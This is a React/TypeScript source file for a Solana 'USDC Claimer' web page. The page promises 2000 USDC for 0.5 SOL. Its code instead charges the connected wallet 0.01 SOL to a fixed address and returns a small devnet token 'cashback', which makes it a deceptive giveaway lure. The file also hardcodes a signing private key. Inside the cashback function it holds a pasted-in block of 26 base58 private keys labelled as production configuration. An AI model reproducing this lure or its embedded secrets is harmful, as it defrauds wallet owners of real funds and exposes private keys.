/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "e2VdLf9WaLMoGwQXY57oMS4GFiRqQAv6vrzXGwuuyXZiW5hjc6YEVupHp97XPEU9ZuXxDJYJvYbSk2BzhyjfYXr"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4WcmaEiWK6S1rGQVy1cAjM6dpRX7db7e578Ge4pKPuBDLe5Ct6vmcrrKRKoPqbjyzowvhJRhmE8y6eyEQLymbFTR",
  "key1": "5mWc8ZoW1wLEezPpUFTweHZwrCjif9TDvMwDM9AaKSTBcFz3N2m5QRmdhupFP39Tux75FnXJK1CxP8FYkaRnhHVt",
  "key2": "3EDSsaRRnsbLyr5hYuL6KsyX4K6sELCMqPn1z1ZvghLw9kQ4rX3w3ehwyiRLh3kpsy65wdxufwcnyEaF7k8wqna3",
  "key3": "5onM1crkPRFTd8iC6buqDrf38uGxAJBDn4rmX5uRJETwwmRzhC1twF3pgQ2eCSdFCJixEewWQuL1cQT982U4UYGx",
  "key4": "4HXef1pxsP1FqErRM92yYKGX1q8vjSKVRoSoJ99cMNgPRKZRwMt2XBMgSStkdT6pEeaDdXWaosw5uJrufrt3ppmY",
  "key5": "CQhYWSWvU3WEX4KzQc9Sq4iPVo6wRM1E7Sp7TQLYhiHtiUC9u1uYqRbEjjtaUXZHAm46Cxc37cAhAQovBwzKgpK",
  "key6": "4xjisaWG3UdBKuop9stv11JhFgHHspda8szgHMrSwXbWvjdw1HrFMVD39kxpEMjS3XyYSJCbtS91HUF7KgQ4QrVJ",
  "key7": "4K5goJehFPC4ayRi6vQxmyS8P9e5mAi3c9uCHeRHRh7zvfuynUhNwrarvn6vpZ4aGFekSGPQG6Fq7H9uCFiZk2q1",
  "key8": "5uPyqJL42Zd1kxnfYozrt5kJq3SWfepxzoJbeS45u6GBm9hThXNLZhQZ5AHEgzrj6KAioRGUPEYkcUWncmxykTn6",
  "key9": "5YQ9Z4AqCzmRmVor2us2dV3ziahFbNrbs7sn4MqMScnVcFmjVEeVg3pVF4y5CbRgSK9pHyA3AM1jFyzjLXxRNsQo",
  "key10": "2VdaG3m8LTrthL4VjqPVJauzcbh4fiZV6yZF4Fg3SGx3FKjKKUPdqLBPH9TrmUBedy5FRpFCPURTm1GSQzRU6TZE",
  "key11": "2mo7paNTvXEcVrGR7z9riYtjQoD8DNVVFphKpFHTvNZBvFTnPumjze9PkADxr96HwFjKxNryWNjxrbzkpogfiAsG",
  "key12": "4nsjZmGPmem2Uko6sqKawGe2t9myC2LrWWQcXUxHRnPFQnZy4aU1mrkF7G8poUhSxoQgHoTxKQwF9KSUkA5VkxaR",
  "key13": "4EvA6zBJHkcKGzKQC1YFU8kvHkHvNFx5fquo5tTK41Wd2aTYXurNamT7RMnLrWZoAdZ88TDonj9GQbh7mo6UfsNY",
  "key14": "2eUsvaBokpdLc5ZLHtXkfw6LmCXUusaLH2CGKziqqN5hSbweef3ZAisfneXLQz1pb3LxPsm3uRRZsf5AzgFnXEQo",
  "key15": "5dq2Q6aXbnauMQEQF6RmozujogveZRkkUEojvqZQidmh9bnRJbedV588vsYAc1hAB2vg359xoYKmQgEtyBacJHnd",
  "key16": "QFpRrc7u8H47dgDRgtzmEic9etUdxmMuR2k92r1kokjixhfPVDd95d7zzpy2kDFzpRUeTbq7qC2PPHesjWznX2E",
  "key17": "DUiqg1ePvN2RjLyHdcmfkv1E4tJGXY5TBLgwKvuagA29pF1VDgd7tFJzSM6N5aCGF8YfaDf4ZQELHTrYnGAeaab",
  "key18": "PbkihoctJQn1SWAiDC3k3zMjLHv7B8QP64EdfD8F81Wpm9KMDYXaDTitfvGLxnwhSt8YjDCKh6eYwYSocJHvseo",
  "key19": "5bXsnCodYJYyZHpgUxCq3BrC7ZVTCeBwqZ8GZob5jo1TRWXT7ykvdcFocJ9azeE7Sv7vtfN6R5Kux2oqjQMBvFjm",
  "key20": "4GxjL4eFJQabnabLbdhY4kLdNMssgZc7rujECcvRMxnxFL1sHrAyVLYWRYgwvENYxVdDdyshsZppZ3eg6By9XMAc",
  "key21": "3zehS1KG1F9UcHUKfkn3LRNxusTv1dELbgygAf2FWH33THnnN78EpJdosuSjpxjXKPWjkEMzTdae6W3izZ6x3qt8",
  "key22": "3YNkPt2QUwrXudBtLuoBu2dn1bzTPQ5AmyThBi5pWEQkHmkioiE2TXV5AemtgzpgwT6dgcDwHPDhsP5K5mrGP5SD",
  "key23": "CvNDxSuikVnRjoq4P5gz67ePjNBiWJYV6eLzXZduB2atE5A3vM66pPcuzoTzhXXQBdazpnNpqYu4kWHdPYWr8Q5",
  "key24": "1dsDceT63o8WPgUzKPCLS2PZ8dwQVi82zgM5jDmVVwKVQpqZyB7HDdbnFF6xPJsnn6Uaqw2wUL3B4qCynW74mWV",
  "key25": "3uoQEL9xwSKsJscdgXWwKK4qBAEQzVJdkAcGpV3i6kLKP7CEMGWSKUceMhkwWiP9nWLnrYc3aoeayjja1zoKBEPy"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
